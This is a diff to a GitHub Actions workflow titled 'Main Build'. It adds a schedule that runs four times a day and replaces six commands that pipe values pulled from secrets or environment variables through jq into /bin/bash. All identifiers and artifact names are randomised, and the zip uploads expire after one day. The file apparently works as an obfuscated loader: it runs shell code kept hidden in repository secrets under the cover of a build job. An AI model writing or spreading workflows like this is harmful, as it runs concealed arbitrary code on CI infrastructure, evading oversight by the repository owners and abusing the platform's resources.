@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '54 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -15,18 +17,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Launch
         env:
-          zst286: ${{ secrets.zst286 }}
+          ca685: ${{ secrets.ca685 }}
         run: |
-          printf '%s' "$zst286" | jq -r .mori2 | /bin/bash
-          printf '%s' "$lfgq2070" | jq -r .qbe6 | /bin/bash
-          echo $ez65960 | jq -r .gyew2456 | /bin/bash
-          echo $f37 | jq -r .b30 | /bin/bash
-          echo $n90808 | jq -r .b781 | /bin/bash
-          echo $lohnk6 | jq -r .znsy7819 | /bin/bash
+          printf '%s' "$ca685" | jq -r .ro759 | /bin/bash
+          echo $dl26655 | jq -r .mas2 | /bin/bash
+          printf '%s' "$itnxn9" | jq -r .tdpm9186 | /bin/bash
+          printf '%s' "$c8" | jq -r .jm25 | /bin/bash
+          printf '%s' "$avgg8" | jq -r .r05 | /bin/bash
+          printf '%s' "$dbbd60" | jq -r .uslxo31 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Nq7OvsYE
+          name: JPSu3g3l
           path: "*.zip"
           retention-days: 1
